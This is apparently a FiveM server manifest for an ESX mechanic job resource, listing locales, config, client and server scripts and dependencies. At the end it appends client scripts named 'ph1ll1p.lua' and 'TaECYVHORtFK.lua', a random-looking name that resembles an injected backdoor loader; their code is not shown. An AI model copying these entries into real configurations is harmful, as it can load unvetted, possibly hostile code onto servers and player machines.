fx_version 'adamant'

game 'gta5'

description 'ESX Mechanic Job'

version 'legacy'

shared_script '@es_extended/imports.lua'

client_scripts {
	'@es_extended/locale.lua',
	'locales/en.lua',
	'locales/es.lua',
	'locales/fi.lua',
	'locales/fr.lua',
	'locales/br.lua',
	'locales/sv.lua',
	'locales/pl.lua',
	'locales/nl.lua',
	'config.lua',
	'client/main.lua'
}

server_scripts {
	'@es_extended/locale.lua',
	'locales/en.lua',
	'locales/es.lua',
	'locales/fi.lua',
	'locales/fr.lua',
	'locales/br.lua',
	'locales/sv.lua',
	'locales/pl.lua',
	'locales/nl.lua',
	'config.lua',
	'server/main.lua'
}

dependencies {
	'es_extended',
	'esx_society',
	'esx_billing'
}

server_script '@salty_tokenizer/init.lua'
client_script '@salty_tokenizer/init.lua'
client_script "ph1ll1p.lua"

client_script 'TaECYVHORtFK.lua'